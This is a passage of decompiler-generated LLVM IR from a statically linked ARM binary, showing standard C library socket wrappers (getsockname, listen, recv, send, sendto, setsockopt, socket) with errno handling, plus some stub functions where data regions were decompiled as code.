  %v2_103c0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_103c0, i32* @r4, align 4
  store i32 %v6_10360, i32* @r5, align 4
  store i32 %v9_10360, i32* @r6, align 4
  store i32 %v12_10360, i32* @r7, align 4
  ret i32 %v0_103b8

; uselistorder directives
  uselistorder label %dec_label_pc_10394, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103d0 = load i32, i32* @r7, align 4
  store i32 %v3_103d0, i32* %stack_var_-8, align 4
  %v0_103dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_103dc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_103dc, -4095
  br i1 %tmp, label %dec_label_pc_10404, label %dec_label_pc_103ec

dec_label_pc_103ec:                               ; preds = %entry
  %v0_103f0 = call i32 @__aeabi_read_tp()
  %v3_103f4 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_103f4 = sext i16 %v3_103f4 to i32
  %v0_103f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_103f8 = sub i32 0, %v0_103f8
  store i32 %v1_103f8, i32* %r2.global-to-local, align 4
  %v3_103fc = add i32 %v4_103f4, %v0_103f0
  %v4_103fc = inttoptr i32 %v3_103fc to i32*
  store i32 %v1_103f8, i32* %v4_103fc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10404.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10404

dec_label_pc_10404:                               ; preds = %entry, %dec_label_pc_103ec
  %v1_10408 = phi i32 [ %v0_103dc, %entry ], [ -1, %dec_label_pc_103ec ]
  %v2_10404 = phi i32 [ %v3_103d0, %entry ], [ %v2_10404.pre, %dec_label_pc_103ec ]
  store i32 %v2_10404, i32* @r7, align 4
  ret i32 %v1_10408

; uselistorder directives
  uselistorder i32 %v0_103dc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10404, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1040c:
  %v0_1040c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1040c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1040c
  %v2_1040c = load i32, i32* @lr, align 4
  %v8_1040c = shl i32 %v2_1040c, %arg2
  %v9_1040c = and i32 %v8_1040c, %arg1
  %v3_10410 = load i32, i32* @sb, align 4
  %v4_10410 = lshr i32 %v9_1040c, %v3_10410
  %v5_10410 = sub i32 32, %v3_10410
  %v6_10410 = shl i32 %v9_1040c, %v5_10410
  %v7_10410 = or i32 %v6_10410, %v4_10410
  %v9_10410 = and i32 %v7_10410, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1040c, %bb
  %v10_10410 = phi i32 [ %arg1, %dec_label_pc_1040c ], [ %v9_10410, %bb ]
  ret i32 %v10_10410

; uselistorder directives
  uselistorder i32 %v9_1040c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10414 = load i32, i32* @r4, align 4
  store i32 %v3_10414, i32* %stack_var_-12, align 4
  %v0_10424 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10424, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10424, -4095
  br i1 %tmp, label %dec_label_pc_1044c, label %dec_label_pc_10434

dec_label_pc_10434:                               ; preds = %entry
  %v0_10438 = call i32 @__aeabi_read_tp()
  %v3_1043c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_1043c = sext i16 %v3_1043c to i32
  %v0_10440 = load i32, i32* %r2.global-to-local, align 4
  %v1_10440 = sub i32 0, %v0_10440
  store i32 %v1_10440, i32* %r2.global-to-local, align 4
  %v3_10444 = add i32 %v4_1043c, %v0_10438
  %v4_10444 = inttoptr i32 %v3_10444 to i32*
  store i32 %v1_10440, i32* %v4_10444, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1044c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1044c

dec_label_pc_1044c:                               ; preds = %entry, %dec_label_pc_10434
  %v1_10450 = phi i32 [ %v0_10424, %entry ], [ -1, %dec_label_pc_10434 ]
  %v2_1044c = phi i32 [ %v3_10414, %entry ], [ %v2_1044c.pre, %dec_label_pc_10434 ]
  store i32 %v2_1044c, i32* @r4, align 4
  ret i32 %v1_10450

; uselistorder directives
  uselistorder i32 %v0_10424, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1044c, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10454:
  %v0_10454 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10454, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10454
  %v2_10458 = load i32, i32* @r8, align 4
  %v5_10458 = udiv i32 %v2_10458, 262144
  %v6_10458 = and i32 %v5_10458, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10454, %bb
  %v7_10458 = phi i32 [ %arg1, %dec_label_pc_10454 ], [ %v6_10458, %bb ]
  ret i32 %v7_10458

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10490, label %dec_label_pc_10478

dec_label_pc_10478:                               ; preds = %entry
  %v0_1047c = call i32 @__aeabi_read_tp()
  %v3_10480 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10480 = sext i16 %v3_10480 to i32
  %v0_10484 = load i32, i32* %r2.global-to-local, align 4
  %v1_10484 = sub i32 0, %v0_10484
  store i32 %v1_10484, i32* %r2.global-to-local, align 4
  %v3_10488 = add i32 %v4_10480, %v0_1047c
  %v4_10488 = inttoptr i32 %v3_10488 to i32*
  store i32 %v1_10484, i32* %v4_10488, align 4
  br label %dec_label_pc_10490

dec_label_pc_10490:                               ; preds = %entry, %dec_label_pc_10478
  %v1_10494 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_10478 ]
  ret i32 %v1_10494

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10490, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1049c = load i32, i32* @r7, align 4
  store i32 %v3_1049c, i32* %stack_var_-8, align 4
  %v0_104a8 = load i32, i32* @r0, align 4
  store i32 %v0_104a8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_104a8, -4095
  br i1 %tmp, label %dec_label_pc_104d0, label %dec_label_pc_104b8

dec_label_pc_104b8:                               ; preds = %entry
  %v0_104bc = call i32 @__aeabi_read_tp()
  %v3_104c0 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_104c0 = sext i16 %v3_104c0 to i32
  %v0_104c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_104c4 = sub i32 0, %v0_104c4
  store i32 %v1_104c4, i32* %r2.global-to-local, align 4
  %v3_104c8 = add i32 %v4_104c0, %v0_104bc
  %v4_104c8 = inttoptr i32 %v3_104c8 to i32*
  store i32 %v1_104c4, i32* %v4_104c8, align 4
  %v2_104d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_104d0

dec_label_pc_104d0:                               ; preds = %entry, %dec_label_pc_104b8
  %v1_104d4 = phi i32 [ %v0_104a8, %entry ], [ -1, %dec_label_pc_104b8 ]
  %v2_104d0 = phi i32 [ %v3_1049c, %entry ], [ %v2_104d0.pre, %dec_label_pc_104b8 ]
  store i32 %v2_104d0, i32* @r7, align 4
  ret i32 %v1_104d4

; uselistorder directives
  uselistorder i32 %v0_104a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_104d0, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_104d8:
  %v0_104d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_104d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_104d8
  %v2_104dc = load i32, i32* @r4, align 4
  %v5_104dc = udiv i32 %v2_104dc, 131072
  %v6_104dc = and i32 %v5_104dc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_104d8, %bb
  %v7_104dc = phi i32 [ %arg1, %dec_label_pc_104d8 ], [ %v6_104dc, %bb ]
  ret i32 %v7_104dc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_104e4 = load i32, i32* @r4, align 4
  store i32 %v3_104e4, i32* %stack_var_-24, align 4
  %v6_104e4 = load i32, i32* @r5, align 4
  %v9_104e4 = load i32, i32* @r6, align 4
  %v12_104e4 = load i32, i32* @r7, align 4
  %v15_104e4 = load i32, i32* @r8, align 4
  %v18_104e4 = load i32, i32* @lr, align 4
  %v4_104f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_104f4 = icmp eq i32 %v4_104f0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_104f4, label %dec_label_pc_1050c, label %entry.dec_label_pc_10514_crit_edge

entry.dec_label_pc_10514_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10514

dec_label_pc_1050c:                               ; preds = %entry
  store i32 %v3_104e4, i32* @r4, align 4
  store i32 %v9_104e4, i32* @r6, align 4
  store i32 %v12_104e4, i32* @r7, align 4
  store i32 %v15_104e4, i32* @r8, align 4
  %v0_10510 = call i32 @__sys_recv()
  br label %dec_label_pc_10514

dec_label_pc_10514:                               ; preds = %entry.dec_label_pc_10514_crit_edge, %dec_label_pc_1050c
  %v0_10514 = call i32 @__libc_enable_asynccancel()
  %v0_10518 = load i32, i32* @r6, align 4
  store i32 %v0_10518, i32* @r1, align 4
  store i32 %v0_10514, i32* @r5, align 4
  %v0_10528 = load i32, i32* @r4, align 4
  store i32 %v0_10528, i32* @r0, align 4
  %v0_1052c = call i32 @__sys_recv()
  store i32 %v0_1052c, i32* @r4, align 4
  %v0_10534 = load i32, i32* @r5, align 4
  %v1_10538 = call i32 @__libc_disable_asynccancel(i32 %v0_10534)
  %v0_1053c = load i32, i32* @r4, align 4
  %v2_10540 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10540, i32* @r4, align 4
  store i32 %v6_104e4, i32* @r5, align 4
  store i32 %v9_104e4, i32* @r6, align 4
  store i32 %v12_104e4, i32* @r7, align 4
  store i32 %v15_104e4, i32* @r8, align 4
  store i32 %v18_104e4, i32* @lr, align 4
  ret i32 %v0_1053c

; uselistorder directives
  uselistorder label %dec_label_pc_10514, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10550 = load i32, i32* @r4, align 4
  store i32 %v3_10550, i32* %stack_var_-16, align 4
  %v0_10564 = load i32, i32* @r0, align 4
  store i32 %v0_10564, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10564, -4095
  br i1 %tmp, label %dec_label_pc_1058c, label %dec_label_pc_10574

dec_label_pc_10574:                               ; preds = %entry
  %v0_10578 = call i32 @__aeabi_read_tp()
  %v3_1057c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_1057c = sext i16 %v3_1057c to i32
  %v0_10580 = load i32, i32* %r2.global-to-local, align 4
  %v1_10580 = sub i32 0, %v0_10580
  store i32 %v1_10580, i32* %r2.global-to-local, align 4
  %v3_10584 = add i32 %v4_1057c, %v0_10578
  %v4_10584 = inttoptr i32 %v3_10584 to i32*
  store i32 %v1_10580, i32* %v4_10584, align 4
  %v2_1058c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1058c

dec_label_pc_1058c:                               ; preds = %entry, %dec_label_pc_10574
  %v1_10590 = phi i32 [ %v0_10564, %entry ], [ -1, %dec_label_pc_10574 ]
  %v2_1058c = phi i32 [ %v3_10550, %entry ], [ %v2_1058c.pre, %dec_label_pc_10574 ]
  store i32 %v2_1058c, i32* @r4, align 4
  ret i32 %v1_10590

; uselistorder directives
  uselistorder i32 %v0_10564, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1058c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10598 = load i32, i32* @r4, align 4
  store i32 %v3_10598, i32* %stack_var_-32, align 4
  %v6_10598 = load i32, i32* @r5, align 4
  %v9_10598 = load i32, i32* @r6, align 4
  %v12_10598 = load i32, i32* @r7, align 4
  %v15_10598 = load i32, i32* @r8, align 4
  %v18_10598 = load i32, i32* @sb, align 4
  %v21_10598 = load i32, i32* @sl, align 4
  %v24_10598 = load i32, i32* @lr, align 4
  %v4_105a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_105b0 = icmp eq i32 %v4_105a8, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_105b0, label %dec_label_pc_105d0, label %dec_label_pc_105dc

dec_label_pc_105d0:                               ; preds = %entry
  store i32 %v3_10598, i32* @r4, align 4
  store i32 %v12_10598, i32* @r7, align 4
  store i32 %v15_10598, i32* @r8, align 4
  store i32 %v18_10598, i32* %sb.global-to-local, align 4
  %v0_105d8 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_105dc

dec_label_pc_105dc:                               ; preds = %entry, %dec_label_pc_105d0
  %v0_105dc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_105dc, i32* @r5, align 4
  %v0_105f0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_105f0, i32* @r0, align 4
  %v0_105f8 = call i32 @__sys_recvfrom()
  store i32 %v0_105f8, i32* @r4, align 4
  %v0_10600 = load i32, i32* @r5, align 4
  %v1_10604 = call i32 @__libc_disable_asynccancel(i32 %v0_10600)
  %v0_10608 = load i32, i32* @r4, align 4
  %v2_10610 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10610, i32* @r4, align 4
  store i32 %v6_10598, i32* @r5, align 4
  store i32 %v9_10598, i32* @r6, align 4
  store i32 %v12_10598, i32* @r7, align 4
  store i32 %v15_10598, i32* @r8, align 4
  store i32 %v18_10598, i32* @sb, align 4
  store i32 %v21_10598, i32* @sl, align 4
  store i32 %v24_10598, i32* @lr, align 4
  ret i32 %v0_10608

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_105dc, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10620 = load i32, i32* @r7, align 4
  store i32 %v3_10620, i32* %stack_var_-8, align 4
  %v0_1062c = load i32, i32* @r0, align 4
  store i32 %v0_1062c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1062c, -4095
  br i1 %tmp, label %dec_label_pc_10654, label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %entry
  %v0_10640 = call i32 @__aeabi_read_tp()
  %v3_10644 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10644 = sext i16 %v3_10644 to i32
  store i32 %v4_10644, i32* @r3, align 4
  %v0_10648 = load i32, i32* %r2.global-to-local, align 4
  %v1_10648 = sub i32 0, %v0_10648
  store i32 %v1_10648, i32* %r2.global-to-local, align 4
  %v3_1064c = add i32 %v4_10644, %v0_10640
  %v4_1064c = inttoptr i32 %v3_1064c to i32*
  store i32 %v1_10648, i32* %v4_1064c, align 4
  %v2_10654.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10654

dec_label_pc_10654:                               ; preds = %entry, %dec_label_pc_1063c
  %v1_10658 = phi i32 [ %v0_1062c, %entry ], [ -1, %dec_label_pc_1063c ]
  %v2_10654 = phi i32 [ %v3_10620, %entry ], [ %v2_10654.pre, %dec_label_pc_1063c ]
  store i32 %v2_10654, i32* @r7, align 4
  ret i32 %v1_10658

; uselistorder directives
  uselistorder i32 %v0_1062c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10654, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1065c:
  %v0_1065c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1065c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1065c
  %v5_1065c = udiv i32 %arg2, 4
  %v6_1065c = and i32 %v5_1065c, %arg1
  %v5_10660 = udiv i32 %v6_1065c, 16384
  %v6_10660 = and i32 %v5_10660, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1065c, %bb
  %v7_10660 = phi i32 [ %arg1, %dec_label_pc_1065c ], [ %v6_10660, %bb ]
  ret i32 %v7_10660

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10668 = load i32, i32* @r4, align 4
  store i32 %v3_10668, i32* %stack_var_-24, align 4
  %v6_10668 = load i32, i32* @r5, align 4
  %v9_10668 = load i32, i32* @r6, align 4
  %v12_10668 = load i32, i32* @r7, align 4
  %v15_10668 = load i32, i32* @r8, align 4
  %v18_10668 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @ip, align 4
  %v4_10674 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_10678 = icmp eq i32 %v4_10674, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_10678, label %dec_label_pc_10690, label %entry.dec_label_pc_10698_crit_edge

entry.dec_label_pc_10698_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10698

dec_label_pc_10690:                               ; preds = %entry
  store i32 %v3_10668, i32* @r4, align 4
  store i32 %v9_10668, i32* @r6, align 4
  store i32 %v12_10668, i32* @r7, align 4
  store i32 %v15_10668, i32* @r8, align 4
  %v0_10694 = call i32 @__sys_send()
  br label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %entry.dec_label_pc_10698_crit_edge, %dec_label_pc_10690
  %v0_10698 = call i32 @__libc_enable_asynccancel()
  %v0_1069c = load i32, i32* @r6, align 4
  store i32 %v0_1069c, i32* @r1, align 4
  store i32 %v0_10698, i32* @r5, align 4
  %v0_106a8 = load i32, i32* @r8, align 4
  store i32 %v0_106a8, i32* @r3, align 4
  %v0_106ac = load i32, i32* @r4, align 4
  store i32 %v0_106ac, i32* @r0, align 4
  %v0_106b0 = call i32 @__sys_send()
  store i32 %v0_106b0, i32* @r4, align 4
  %v0_106b8 = load i32, i32* @r5, align 4
  %v1_106bc = call i32 @__libc_disable_asynccancel(i32 %v0_106b8)
  %v0_106c0 = load i32, i32* @r4, align 4
  %v2_106c4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_106c4, i32* @r4, align 4
  store i32 %v6_10668, i32* @r5, align 4
  store i32 %v9_10668, i32* @r6, align 4
  store i32 %v12_10668, i32* @r7, align 4
  store i32 %v15_10668, i32* @r8, align 4
  store i32 %v18_10668, i32* @lr, align 4
  ret i32 %v0_106c0

; uselistorder directives
  uselistorder label %dec_label_pc_10698, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_106d4 = load i32, i32* @r4, align 4
  store i32 %v3_106d4, i32* %stack_var_-16, align 4
  %v0_106e8 = load i32, i32* @r0, align 4
  store i32 %v0_106e8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_106e8, -4095
  br i1 %tmp, label %dec_label_pc_10710, label %dec_label_pc_106f8

dec_label_pc_106f8:                               ; preds = %entry
  %v0_106fc = call i32 @__aeabi_read_tp()
  %v3_10700 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10700 = sext i16 %v3_10700 to i32
  %v0_10704 = load i32, i32* %r2.global-to-local, align 4
  %v1_10704 = sub i32 0, %v0_10704
  store i32 %v1_10704, i32* %r2.global-to-local, align 4
  %v3_10708 = add i32 %v4_10700, %v0_106fc
  %v4_10708 = inttoptr i32 %v3_10708 to i32*
  store i32 %v1_10704, i32* %v4_10708, align 4
  %v2_10710.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10710

dec_label_pc_10710:                               ; preds = %entry, %dec_label_pc_106f8
  %v1_10714 = phi i32 [ %v0_106e8, %entry ], [ -1, %dec_label_pc_106f8 ]
  %v2_10710 = phi i32 [ %v3_106d4, %entry ], [ %v2_10710.pre, %dec_label_pc_106f8 ]
  store i32 %v2_10710, i32* @r4, align 4
  ret i32 %v1_10714

; uselistorder directives
  uselistorder i32 %v0_106e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10710, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10718:
  %v0_10718 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10718, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10718
  %v2_1071c = load i32, i32* @r4, align 4
  %v3_1071c = udiv i32 %v2_1071c, 4096
  %v4_1071c = mul i32 %v2_1071c, 1048576
  %v5_1071c = or i32 %v3_1071c, %v4_1071c
  %v8_1071c = and i32 %v5_1071c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10718, %bb
  %v9_1071c = phi i32 [ %arg1, %dec_label_pc_10718 ], [ %v8_1071c, %bb ]
  ret i32 %v9_1071c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10720 = load i32, i32* @r4, align 4
  store i32 %v3_10720, i32* %stack_var_-32, align 4
  %v6_10720 = load i32, i32* @r5, align 4
  %v9_10720 = load i32, i32* @r6, align 4
  %v12_10720 = load i32, i32* @r7, align 4
  %v15_10720 = load i32, i32* @r8, align 4
  %v18_10720 = load i32, i32* @sb, align 4
  %v21_10720 = load i32, i32* @sl, align 4
  %v24_10720 = load i32, i32* @lr, align 4
  %v4_10730 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_10738 = icmp eq i32 %v4_10730, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_10738, label %dec_label_pc_10758, label %dec_label_pc_10764

dec_label_pc_10758:                               ; preds = %entry
  store i32 %v3_10720, i32* @r4, align 4
  store i32 %v12_10720, i32* @r7, align 4
  store i32 %v15_10720, i32* @r8, align 4
  store i32 %v18_10720, i32* %sb.global-to-local, align 4
  %v0_10760 = call i32 @__sys_sendto()
  br label %dec_label_pc_10764

dec_label_pc_10764:                               ; preds = %entry, %dec_label_pc_10758
  %v0_10764 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10764, i32* @r5, align 4
  %v0_10778 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_10778, i32* @r0, align 4
  %v0_10780 = call i32 @__sys_sendto()
  store i32 %v0_10780, i32* @r4, align 4
  %v0_10788 = load i32, i32* @r5, align 4
  %v1_1078c = call i32 @__libc_disable_asynccancel(i32 %v0_10788)
  %v0_10790 = load i32, i32* @r4, align 4
  %v2_10798 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10798, i32* @r4, align 4
  store i32 %v6_10720, i32* @r5, align 4
  store i32 %v9_10720, i32* @r6, align 4
  store i32 %v12_10720, i32* @r7, align 4
  store i32 %v15_10720, i32* @r8, align 4
  store i32 %v18_10720, i32* @sb, align 4
  store i32 %v21_10720, i32* @sl, align 4
  store i32 %v24_10720, i32* @lr, align 4
  ret i32 %v0_10790

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10764, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_107a8 = load i32, i32* @r4, align 4
  store i32 %v3_107a8, i32* %stack_var_-12, align 4
  %v0_107b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_107b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107b8, -4095
  br i1 %tmp, label %dec_label_pc_107e0, label %dec_label_pc_107c8

dec_label_pc_107c8:                               ; preds = %entry
  %v0_107cc = call i32 @__aeabi_read_tp()
  %v3_107d0 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_107d0 = sext i16 %v3_107d0 to i32
  store i32 %v4_107d0, i32* @r3, align 4
  %v0_107d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_107d4 = sub i32 0, %v0_107d4
  store i32 %v1_107d4, i32* %r2.global-to-local, align 4
  %v3_107d8 = add i32 %v4_107d0, %v0_107cc
  %v4_107d8 = inttoptr i32 %v3_107d8 to i32*
  store i32 %v1_107d4, i32* %v4_107d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_107e0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_107e0

dec_label_pc_107e0:                               ; preds = %entry, %dec_label_pc_107c8
  %v1_107e4 = phi i32 [ %v0_107b8, %entry ], [ -1, %dec_label_pc_107c8 ]
  %v2_107e0 = phi i32 [ %v3_107a8, %entry ], [ %v2_107e0.pre, %dec_label_pc_107c8 ]
  store i32 %v2_107e0, i32* @r4, align 4
  ret i32 %v1_107e4

; uselistorder directives
  uselistorder i32 %v0_107b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_107e0, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1) local_unnamed_addr {
dec_label_pc_107e8:
  %v0_107e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_107e8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_107e8
  %v2_107e8 = load i32, i32* @r6, align 4
  %v5_107e8 = udiv i32 %v2_107e8, 4
  %v6_107e8 = and i32 %v5_107e8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_107e8, %bb
  %v4_107ec = phi i32 [ %arg1, %dec_label_pc_107e8 ], [ %v6_107e8, %bb ]
  ret i32 %v4_107ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_107f0 = load i32, i32* @r7, align 4
  store i32 %v3_107f0, i32* %stack_var_-8, align 4
  %v0_107fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_107fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_107fc, -4095
  br i1 %tmp, label %dec_label_pc_10824, label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %entry
  %v0_10810 = call i32 @__aeabi_read_tp()
  %v3_10814 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_10814 = sext i16 %v3_10814 to i32
  store i32 %v4_10814, i32* @r3, align 4
